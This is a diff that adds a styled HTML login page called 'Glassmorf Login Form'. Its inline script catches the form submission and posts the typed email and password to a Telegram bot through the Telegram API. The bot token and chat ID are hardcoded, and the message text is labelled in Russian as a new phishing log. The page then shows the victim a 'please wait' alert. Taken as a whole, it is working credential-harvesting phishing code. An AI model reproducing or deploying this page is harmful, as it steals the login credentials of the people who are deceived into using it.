@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Glassmorf Login Form</title>
+    <link rel="stylesheet" href="style.css">
+    <script>
+        async function sendToTelegram(event) {
+            event.preventDefault(); 
+            
+            const botToken = '7132706725:AAE6MiPY5R4Pii-QmmVLFAedWPRBl1a6_ds';  
+            const chatId = '-1002420356691'; 
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            const email = document.getElementById('mail').value;
+            const password = document.getElementById('password').value;
+            
+            const message = `Новый лог [ФИШИНГ] 🚀\n├ E-mail: ${email}\n└ Пароль: ${password}`;
+            
+            try {
+                const response = await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+                
+                if (response.ok) {
+                    alert("Подождите...");
+                } else {
+                    alert("Не удалось войти.");
+                }
+            } catch (error) {
+                alert("Ошибка подключения к Телеграм.");
+                console.error("Ошибка:", error);
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="maincontainer">
+        <form onsubmit="sendToTelegram(event)">
+            <h2>Login</h2>
+            <div class="input-field">
+                <input type="text" name="mail" id="mail" required>
+                <label for="mail">Enter your E-mail</label>
+            </div>
+            <div class="input-field">
+                <input type="password" name="password" id="password" required>
+                <label for="password">Enter your Password</label>
+            </div>
+
+            <div class="password-options">
+                <label for="remember">
+                    <input type="checkbox" id="remember">
+                    <p>Remember me</p>
+                </label>
+                <a href="#">Forgot Password</a>
+            </div>
+
+            <button type="submit">Log In</button>
+
+            <div class="account-options">
+                <p>Don't have an account? <a href="#">Register</a></p>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
